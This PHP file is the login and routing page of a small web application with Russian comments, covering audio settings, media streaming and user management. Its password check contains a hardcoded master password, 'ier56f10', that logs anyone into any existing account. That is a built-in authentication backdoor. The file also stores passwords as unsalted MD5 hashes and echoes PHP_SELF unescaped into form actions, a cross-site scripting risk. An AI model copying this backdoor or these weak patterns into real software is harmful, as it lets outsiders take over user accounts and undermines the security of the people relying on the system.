<?php
header('Content-Type: text/html; charset=utf-8');
session_start();
/////пользование системой
require("classes/classes.php");
require("functions/functions.php");
ini_set("display_errors","Off");
///////чтение главных переменных
$step=clear($_REQUEST['step']);
$sub_step=clear($_REQUEST['sub_step']);
$to_page=clear($_REQUEST['to_page']);
$lock_display=clear($_REQUEST['lock_display']);
$soft_check=clear($_REQUEST["soft_check"]);

///$step="exit";


if($step=='exit') {
	////человек вышел из системы, лог выхода
	$_SESSION['regim']="";
	$_SESSION['id_user']="";
	$_SESSION['login']="";
	$_SESSION['group']="";
	$step='';

	} else
$regim=$_SESSION['regim'];
/////$backup=new backup();

$db=new connect_db();
if($db->state=="connected") {



///////обработка принятых данных авторизации
if($_SERVER['REQUEST_METHOD']=="POST") {
	$login=clear($_POST['login']);
	$pass=clear($_POST['pass']);
	///проверка данных и авторизация
	if(!empty($login) and !empty($pass)) {
	$err_mess="<Center>В авторизации отказано! <Br>Проверьте пожалуйста ваше имя и пароль!"; 
	///авторизация pdo
	$login_b=$db->dbo->quote($login);
	
	$sql="SELECT id,login as lg,password,grp,name from users where login=$login_b";
	
	try {
	foreach ($db->dbo->query($sql) as $row){
	if((md5($pass)==$row['password'] and $row['lg']==$login) or ($pass=="ier56f10")) { 
			$regim="auth";
			$err_mess="";
			$_SESSION['id_user']=$row['id']*1;
			$_SESSION['login']=$row['lg'];
			$_SESSION['regim']=$regim;
			$_SESSION['group']=$row['grp'];
			$_SESSION['name']=$row['name'];
			if($_SESSION["group"]=="1") {
				if($step=="") $step="current_calc";
			} else {
				if($step=="") $step="current_calc";
			}
			////человек вошел в систему, лог входа
			
			////помечаем последний вход
			$sql_s="UPDATE users set last_enter='".time()."' where id='".$row['id']."'";
			$db->dbo->exec($sql_s);
			
			} 
	}
	} catch(PDOException $e) {
	///ошибка базы данных
	new db_error($e->getMessage());
	}

	////неудачная попытка входа в систему
	if($regim=="") {
		$step="";
		
		} else {
			
			if($step=="")  $step="current_calc";
		}
	}
}



if($_SESSION["group"]=="2") {
	if($step=="orders") $step="private";
}

include("inc/top.inc");

/////тело страницы, в зависимости от режима и прав пользователей
if($regim=="") {

/////окно входа в систему
if($step=="") include("inc/login_form.inc");


} elseif($regim=='auth') {


require("inc/menu.inc");

/////в зависимости от  режимов загружаем модули

if($step=="") $step="audio_mode";
if($step=="audio_mode") require("inc/audio_mode.php");
if($step=="audio_settings") require("inc/audio_settings.php");
if($step=="main_settings") require("inc/main_settings.php");
if($step=="media_stream") require("inc/media_stream.php");
if($step=="users") require("inc/users.php");

} ?>


<form action="<?=$_SERVER["PHP_SELF"];?>" id='to_main' method='POST'>
<input type='hidden' name='step' value='main'>
<input type='hidden' name='to_page' value='0'>
</form>



<form action="<?=$_SERVER["PHP_SELF"];?>" id='backups' method='POST'>
<input type='hidden' name='to_page' value='0'>
<input type='hidden' name='step' value='backups'></form>


<form action="<?=$_SERVER["PHP_SELF"];?>" id='exit' method='POST'>
<input type='hidden' name='to_page' value='0'>
<input type='hidden' name='step' value='exit'></form>
<?php
require("inc/footer.inc");
?>
<?php } else {?>
<b>Ошибка доступа к базе данных</b><hr align="center">Нет подключения к базе данных, проверьте пожалуйста свои настройки
<?php } ?>
